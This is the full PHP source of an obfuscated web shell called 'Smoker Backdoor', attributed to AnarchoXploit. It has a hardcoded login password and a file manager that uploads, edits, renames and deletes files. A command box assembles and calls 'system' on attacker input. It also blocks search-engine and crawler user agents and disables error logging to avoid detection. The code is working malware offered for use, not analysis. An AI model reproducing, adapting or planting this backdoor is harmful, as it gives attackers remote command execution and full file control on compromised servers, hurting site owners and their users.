<?php

// default password : smoker
// Created By AnarchoXploit - Copyright - All Reserved
// Coded By Afrizal F.A

goto IGf0z;
ZC0s9:
?>
<br><br>
<form enctype="multipart/form-data" method="post">Upload : <input type="file" name="upd"><input type="submit" value="Upload"><?php
goto ZyPkR;
Vr3bF:
if (
    preg_match(
        $user_agent_block,
        $_SERVER["\x48\x54\124\x50\137\125\x53\x45\122\137\x41\107\105\x4e\124"]
    )
) {
    header(
        "\x48\x54\124\x50\57\61\56\60\40\64\x30\x34\40\x4e\157\x74\x20\106\x6f\x75\156\x64"
    );
    die();
}
goto mJSyl;
dQBTm:
@ini_set(
    "\155\141\x78\137\x65\170\145\x63\165\164\x69\x6f\x6e\x5f\164\x69\x6d\145",
    0
);
goto JHj8n;
lOv6W:
if ($_GET["\x65\x64\x69\x74"] == "\x74\162\x75\x65") {
    echo "\x3c\146\x6f\162\x6d\40\x65\x6e\143\164\x79\x70\145\x3d\42\x6d\x75\154\x74\151\160\141\162\164\57\x66\x6f\x72\x6d\x2d\144\x61\x74\x61\42\x20\x6d\145\x74\150\157\x64\x3d\42\x70\157\x73\164\42\76\12\x20\x20\x3c\x74\x65\x78\x74\x61\162\145\141\40\163\x74\171\x6c\145\x3d\42\167\x69\x64\x74\150\x3a\x20\x31\x30\60\45\x3b\x20\150\x65\151\x67\150\164\x3a\x20\x31\65\x30\x70\x78\x3b\x22\x20\x6e\x61\155\145\x3d\42\145\x64\x69\164\137\x66\x69\x6c\x65\x22\x3e" .
        htmlspecialchars(file_get_contents($_GET["\x66\151\154\x65"])) .
        "\74\57\164\145\170\x74\141\162\145\141\x3e\xa\40\x20\74\x62\x72\x3e\74\x62\x72\x3e\xa\40\x20\106\x69\x6c\x65\40\116\141\155\x65\x20\x3a\40\x3c\151\x6e\x70\x75\164\40\x74\171\x70\145\75\42\164\145\x78\164\x22\40\x6e\x61\155\x65\x3d\x22\156\141\155\x61\137\146\42\x20\x76\x61\154\165\145\x3d\x22{$_GET["\146\151\154\145"]}\x22\76\12\40\40\74\x62\x72\76\x3c\x62\162\76\xa\x20\x20\74\151\x6e\x70\165\164\x20\x74\171\160\x65\75\x22\x73\x75\x62\155\x69\x74\42\x20\x76\x61\154\x75\145\x3d\x22\123\x61\166\x65\40\106\x69\154\145\x22\76\xa\x20\x20\x3c\57\146\x6f\x72\155\x3e\12\40\40";
    if ($_POST["\145\144\151\164\x5f\146\x69\x6c\x65"]) {
        unlink($_GET["\146\151\x6c\x65"]);
        $fedit = fopen($_POST["\156\141\x6d\141\137\x66"], "\167");
        if (fwrite($fedit, $_POST["\x65\x64\151\164\x5f\146\x69\x6c\x65"])) {
            fclose($fedit);
            echo "\x3c\x73\143\162\151\160\164\76\141\x6c\x65\x72\164\50\47\x45\x64\x69\164\x20\x46\151\x6c\145\40\x53\165\143\x63\x65\163\163\x20\x21\41\41\47\51\x3b\40\167\x69\x6e\x64\157\167\x2e\154\157\x63\141\164\x69\x6f\156\40\75\40\47\x3f\x66\151\x6c\x65\75{$_POST["\x6e\141\155\141\x5f\x66"]}\x27\x3b\74\57\x73\143\162\x69\x70\164\x3e";
        } else {
            echo "\x3c\x73\143\x72\151\x70\x74\76\141\154\145\x72\x74\x28\x27\105\144\x69\164\x20\x46\x69\x6c\x65\x20\106\141\151\154\x65\144\40\41\41\41\47\x29\73\x20\x77\x69\x6e\144\x6f\167\56\x6c\x6f\143\141\164\x69\157\x6e\x20\x3d\x20\47\x3f\x66\151\x6c\145\75{$_POST["\x6e\141\x6d\141\x5f\146"]}\47\x3b\x3c\x2f\163\143\162\x69\160\x74\76";
        }
    }
}
goto nC2z9;
ZyPkR:
if ($_FILES["\165\160\x64"]) {
    if (
        copy(
            $_FILES["\x75\160\144"]["\x74\155\x70\x5f\x6e\x61\x6d\145"],
            $dir . "\57" . $_FILES["\165\160\x64"]["\156\x61\155\x65"]
        )
    ) { ?>
	<b>Uploaded</b><?php } else { ?>
	<b>Failed Upload</b><?php }
}
goto KXVBV;
atZEc:
if (isset($_REQUEST["\154\157\x67\157\x75\x74"])) {
    session_destroy();
    header("\114\x6f\x63\141\x74\151\x6f\156\72\40\77");
}
goto lfZoy;
AMgqQ:
?>
	</textarea><br><br>
	<center><?php
 goto rMQn7;
 kYHPh:
 foreach ($exp as $x => $dirx) {
     if (empty($dirx)) {
         continue;
     }
     $do .= "\57\x3c\x61\40\x68\162\x65\x66\x3d\47\x3f\144\75";
     for ($i = 0; $i <= $x; $i++) {
         $do .= $exp[$i] . "\57";
     }
     $do .= "\x27\x3e{$dirx}\x3c\x2f\141\76";
 }
 goto fyV16;
 rMQn7:
 if ($_GET["\146\x69\x6c\x65"]) {
     if (
         !$_GET["\x65\144\151\164"] &&
         !$_GET["\x64\145\x6c\145\164\145"] &&
         !$_GET["\162\x65\x6e\x61\155\x65"] &&
         !$_GET["\162\155\146\x6f\154\144\x65\162"]
     ) {
         echo "\74\164\145\170\164\141\162\x65\x61\40\163\x74\x79\154\x65\75\x22\x77\x69\x64\x74\150\72\x20\61\x30\x30\x25\73\40\x68\145\x69\147\150\164\x3a\x20\x31\65\x30\x70\x78\73\x20\143\157\x6c\157\162\72\40\x61\161\x75\x61\x3b\x22\x3e" .
             htmlspecialchars(file_get_contents($_GET[file])) .
             "\x3c\x2f\x74\145\170\164\141\x72\x65\141\x3e";
     }
 }
 goto lOv6W;
 Q1OFe:
 if ($_GET["\x64"]) {
     $dir_raw = $_GET["\144"];
     chdir($_GET["\144"]);
 } else {
     $dir_raw = str_replace("\134", "\x2f", getcwd());
 }
 goto rZ9OS;
 NJzU0:
 ?>
	</center><br><br>Path :<?php
 goto q0OgI;
 q0OgI:
 echo $do;
 goto ZC0s9;
 BpERn:
 $passwd = "smoker";
 goto YELWk;
 YELWk:
 if ($_POST["\160\x61\x73\x73"]) {
     if ($_POST["\160\x61\163\x73\x77\144"] == $passwd) {
         $_SESSION["\x65\156\x74\x65\162"] = "\x65\156\x74\145\162";
         header("\x4c\x6f\143\141\x74\151\x6f\156\x3a\x20\x3f");
     }
 }
 goto atZEc;
 C9PUH:
 if ($_GET["\x64\x65\154\x65\164\x65"] == "\x74\x72\165\x65") {
     if (unlink($_GET["\x66\x69\154\x65"])) {
         echo "\x3c\x73\143\x72\x69\160\164\x3e\141\x6c\145\x72\164\50\x27\x46\x69\154\145\40\104\x65\154\x65\164\145\x64\40\41\41\41\47\x29\x3b\40\167\151\x6e\144\x6f\x77\x2e\x6c\x6f\143\141\164\151\x6f\156\x20\75\40\47\x3f\x27\x3b\74\x2f\x73\143\x72\151\160\x74\x3e";
     } else {
         echo "\x3c\163\x63\162\151\x70\164\76\141\x6c\145\x72\164\x28\47\124\150\x69\163\x20\106\151\x6c\x65\x20\151\163\40\106\141\x69\154\x65\144\x20\104\x65\154\145\x74\145\40\x21\41\41\x27\51\x3b\x20\167\x69\156\144\x6f\x77\x2e\154\157\143\141\164\x69\x6f\156\x20\x3d\40\47\x3f\47\73\x3c\x2f\x73\143\x72\151\x70\164\x3e";
     }
 }
 goto CrbOW;
 ZgZvC:
 ?>
	<html>

		<head>
			<title>Smoker Backdoor</title>
			<link href="https://i.screenshot.net/z7xj4fg" rel="icon">
			<style>
				html {
					background: url(https://wallup.net/wp-content/uploads/2016/01/245263-space-smoke-men-748x421.jpg);
					background-size: cover;
					background-color: #000;
					background-repeat: no-repeat;
					background-position: center;
					background-attachment: fixed;
					color: #fff
				}

				a {
					text-decoration: none;
					color: #0ff
				}

				tr:hover {
					background: #fff;
					color: #000
				}

				tr:hover a {
					text-decoration: none;
					color: #000
				}

				input {
					background: 0 0;
					color: #0ff;
					border: 1px solid #fff
				}

				textarea {
					background: 0 0;
					color: #fff
				}
			</style>
		</head>

		<body>
			<center>
				<font style="color:#0ff" size="10">Smoker Backdoor</font><br><br>Kernel :<?php
    goto PeYM6;
    HRIz1:
    @clearstatcache();
    goto pHFGp;
    IGf0z:
    error_reporting(0);
    goto HRIz1;
    KXVBV:
    ?>
</form>
<center>[ <a href="?">Home Directory</a> ] [ <a href="?logout=true">Log Out</a> ]</center>
<form enctype="multipart/form-data" method="post">
	<font style="color:#0ff">{WebShell}</font> -> <input name="0"><input type="submit" value=">">
</form><textarea style="width:100%;height:150px;color:#0ff"><?php
goto lsrW5;
LHFAC:
$user_agent_block =
    "\57\x47\157\157\147\154\x65\x7c\127\150\141\164\163\x41\160\x70\174\124\x65\x6c\145\x67\x72\141\x6d\x7c\x62\x69\x6e\147\x7c\102\151\156\x67\174\x79\141\x68\x6f\157\x7c\131\x61\150\x6f\157\x7c\115\123\116\102\157\x74\x7c\x53\154\x75\x72\160\x7c\x50\x79\143\x55\122\x4c\x7c\146\x61\143\145\x62\x6f\157\x6b\174\151\x61\x5f\141\162\143\x68\151\166\x65\162\174\x63\x72\x61\x77\x6c\x65\x72\x7c\131\x61\x6e\x64\x65\170\x2f";
goto Vr3bF;
pHFGp:
@ini_set("\145\162\x72\x6f\x72\137\154\x6f\147", null);
goto IRFkd;
R6GhI:
@ini_set("\144\151\163\x70\154\x61\171\137\x65\162\162\x6f\162\x73", 0);
goto LHFAC;
lfZoy:
if (empty($_SESSION["\x65\156\x74\145\x72"])) { ?>
<html><head><title>Smoker Backdoor</title><link href="https://i.screenshot.net/z7xj4fg"rel="icon"><style>html{background:url(https://wallup.net/wp-content/uploads/2016/01/245263-space-smoke-men-748x421.jpg);background-size:cover;background-color:#000;background-repeat:no-repeat;background-position:center;background-attachment:fixed;color:#fff}input{background:0 0;color:#0ff;border:1px solid #fff}</style></head><body><table width="100%"height="100%"><td align="center"><font style="color:#0ff"size="10">Smoker Backdoor</font><br><br>Smoking, Like Exploring The Universe<br><br><form enctype="multipart/form-data"method="post"><input type="password"name="passwd"> <input type="submit"name="pass"value="Login"></form></td></table></body></html><?php die();}
goto Q1OFe;
PeYM6:
echo php_uname();
goto NJzU0;
sVxIA:
if ($_GET["\x72\155\146\157\154\144\145\162"] == "\164\162\x75\x65") {
    if (rmdir($_GET["\x66\157\x6c\144\x65\162"])) {
        echo "\x3c\163\x63\x72\x69\x70\x74\x3e\141\x6c\145\162\x74\50\47\106\x6f\154\144\145\162\40\104\x65\x6c\145\x74\145\144\x20\41\x21\x21\x27\51\73\x20\167\x69\156\144\157\167\56\x6c\x6f\143\x61\x74\x69\x6f\x6e\x20\x3d\x20\47\77\x27\73\74\x2f\163\143\162\151\160\164\x3e";
    } else {
        echo "\x3c\163\143\162\x69\160\164\x3e\141\x6c\x65\162\164\x28\x27\124\x68\x69\x73\x20\106\157\154\x64\x65\x72\x20\151\163\x20\x46\x61\x69\x6c\145\x64\40\x44\x65\154\x65\x74\x65\x20\x21\x21\x21\x27\51\x3b\x20\x77\151\x6e\144\x6f\x77\56\154\x6f\143\141\x74\151\157\156\x20\75\x20\47\x3f\47\73\74\x2f\163\143\162\151\x70\164\76";
    }
}
goto C9PUH;
lsrW5:
if ($_POST["\x30"]) {
    echo htmlspecialchars(
        ($_[0][] = @$_POST["\60"]) .
            ($_[1][] = "\163") .
            ($_[1][] = "\171") .
            ($_[1][] = "\163\x74") .
            ($_[1][] = "\145\x6d") .
            ($l = @get_defined_vars()["\x5f"][1]) .
            ($´ .= $l[0]) .
            ($´ .= $l[1]) .
            ($´ .= $l[2]) .
            ($´ .= $l[3]) .
            $´("{$_[0][0]}")
    );
}
goto AMgqQ;
mJSyl:
session_start();
goto BpERn;
nC2z9:
if ($_GET["\x72\145\156\x61\155\x65"] == "\x74\162\165\145") {
    echo "\x3c\x66\x6f\x72\x6d\x20\x65\x6e\x63\x74\x79\160\x65\75\x22\155\165\x6c\164\x69\x70\x61\x72\164\x2f\146\x6f\162\155\x2d\144\141\x74\x61\42\40\x6d\145\x74\150\x6f\x64\x3d\x22\x70\x6f\163\x74\42\76\xa\40\x20" .
        htmlspecialchars($_GET["\146\x69\x6c\x65"]) .
        "\x20\133\x20\x54\157\40\x5d\x20\x3c\x69\156\x70\165\164\x20\164\x79\x70\145\x3d\42\x74\145\x78\x74\x22\40\156\x61\155\145\75\42\x72\145\156\141\x6d\145\x5f\x66\x69\154\145\x22\76\12\40\x20\x3c\151\156\x70\165\164\40\164\171\x70\x65\75\x22\163\x75\x62\x6d\151\x74\42\40\166\141\154\165\x65\75\42\122\145\x6e\x61\155\x65\42\76\xa\40\40\74\x2f\x66\157\x72\x6d\76\xa\x20\40";
    if ($_POST["\162\145\x6e\141\155\x65\137\146\151\x6c\x65"]) {
        if (
            rename(
                $_GET["\x66\x69\154\x65"],
                $_POST["\x72\145\156\141\155\x65\137\x66\x69\154\x65"]
            )
        ) {
            echo "\x3c\163\x63\x72\151\160\x74\76\141\154\145\162\x74\50\x27\123\165\143\x63\x65\163\163\x20\122\x65\x6e\x61\x6d\145\x64\x20\41\x21\x21\47\51\x3b\x20\167\151\156\x64\x6f\x77\x2e\154\x6f\x63\141\164\x69\x6f\156\x20\75\x20\47\77\x27\x3b\74\57\163\x63\162\x69\160\x74\x3e";
        } else {
            echo "\x3c\x73\143\162\x69\x70\164\76\141\154\x65\x72\164\50\47\106\141\151\154\x65\144\x20\122\x65\156\x61\x6d\x65\144\40\41\x21\41\47\51\x3b\40\167\x69\x6e\144\157\167\56\154\x6f\x63\x61\x74\x69\157\156\40\x3d\x20\x27\x3f\x27\x3b\x3c\57\x73\x63\162\151\160\164\x3e";
        }
    }
}
goto sVxIA;
IRFkd:
@ini_set("\x6c\x6f\x67\137\145\162\x72\x6f\x72\x73", 0);
goto dQBTm;
JHj8n:
@ini_set("\157\x75\164\160\165\164\137\x62\x75\x66\146\145\162\151\156\147", 0);
goto R6GhI;
CrbOW:
if (empty($_GET["\x66\x69\154\145"])) { ?>
<table width="100%"><tr><th class="c"style="border:1px solid #fff">Name File</th><th class="c"style="border:1px solid #fff"colspan="2">Action</th></tr><?php
$scndir = scandir($dir);
foreach ($scndir as $sdir) {
    if (is_dir($dir . "\x2f" . $sdir)) {
        echo "\74\164\x72\x3e\12\x20\x20\40\x20\x20\x20\x3c\164\144\x3e\74\141\40\x68\162\145\146\75\47\x3f\144\75{$dir}\57{$sdir}\47\x3e\x3c\x69\155\147\40\150\145\x69\x67\x68\164\75\x27\62\x30\x27\40\x73\x72\143\75\x27\150\x74\x74\160\72\x2f\57\151\143\157\x6e\x73\56\151\143\157\156\x61\162\143\150\151\166\x65\56\x63\157\x6d\x2f\151\143\x6f\x6e\163\x2f\x70\141\x6f\x6d\x65\144\151\x61\57\x73\155\x61\154\154\x2d\x6e\x2d\146\154\141\164\x2f\61\x30\62\64\57\146\x6f\154\144\x65\x72\55\x69\143\157\156\x2e\160\x6e\147\x27\x2f\x3e\x20" .
            htmlspecialchars($sdir) .
            "\x3c\x2f\141\x3e\74\57\164\x64\76\xa\40\40\40\40\40\x20\x3c\164\x64\x3e\74\x61\x20\x68\x72\145\x66\x3d\47\77\146\151\154\145\75{$dir}\57{$sdir}\46\x72\145\156\141\x6d\x65\75\x74\162\165\x65\47\76\122\x65\x6e\x61\155\x65\x3c\x2f\x61\x3e\x3c\x2f\164\x64\76\12\x20\40\40\x20\40\40\x3c\x74\x64\x3e\74\x61\40\150\x72\x65\x66\x3d\x27\x3f\x66\157\154\x64\x65\162\75{$dir}\x2f{$sdir}\x26\162\155\x66\x6f\x6c\x64\145\162\x3d\x74\x72\x75\145\47\x3e\104\145\154\145\164\x65\74\57\141\x3e\x3c\57\164\144\x3e\xa\x20\x20\x20\40\40\40\74\57\164\162\76\xa\x20\x20\x20\40\x20\x20";
    }
    if (is_file($dir . "\57" . $sdir)) {
        echo "\74\164\162\76\12\40\40\x20\40\x20\x20\x3c\164\144\76\x3c\141\40\x68\x72\145\146\x3d\47\77\146\x69\x6c\145\75{$dir}\x2f{$sdir}\47\x3e\x3c\151\155\x67\40\150\x65\151\147\x68\x74\75\47\62\x30\x27\40\x73\162\143\x3d\47\x68\164\x74\160\x3a\57\57\151\143\x6f\x6e\163\x2e\151\x63\x6f\x6e\141\x72\x63\150\x69\x76\x65\56\x63\157\155\x2f\151\143\x6f\156\163\57\172\150\x6f\157\154\145\x67\x6f\57\155\x61\164\145\x72\151\141\154\57\65\x31\x32\x2f\x46\151\154\x65\164\x79\160\x65\55\104\x6f\x63\x73\x2d\x69\143\157\156\x2e\160\156\147\47\x2f\x3e\40" .
            htmlspecialchars($sdir) .
            "\x3c\57\x61\76\x3c\x2f\x74\144\x3e\12\40\40\40\x20\40\x20\74\164\144\76\x3c\141\x20\x68\x72\145\x66\x3d\47\x3f\146\151\x6c\145\75{$dir}\x2f{$sdir}\x26\145\x64\151\x74\75\164\x72\165\145\47\76\x45\x64\x69\164\x3c\x2f\141\x3e\x3c\57\164\x64\76\12\x20\x20\40\40\x20\40\x3c\164\144\x3e\x3c\x61\x20\x68\162\145\x66\75\47\x3f\146\151\154\x65\75{$dir}\57{$sdir}\x26\144\x65\154\145\164\x65\75\164\162\x75\x65\x27\76\x44\x65\154\x65\x74\x65\x3c\57\141\x3e\x3c\x2f\x74\144\76\12\40\x20\40\40\x20\40\x3c\57\164\162\76\12\40\x20\x20\40\x20\40";
    }
}
?>
</table><?php }
goto l2jq8;
fyV16:
if ($_GET["\144"]) {
    $dir = $_GET["\x64"];
} else {
    $dir = getcwd();
}
goto ZgZvC;
rZ9OS:
$exp = explode("\57", $dir_raw);
goto kYHPh;
l2jq8:
?>
</center><br><div style="padding:10px;border:1px solid #fff;color:#0ff;text-align:center">Smoker Backdoor</div></body></html>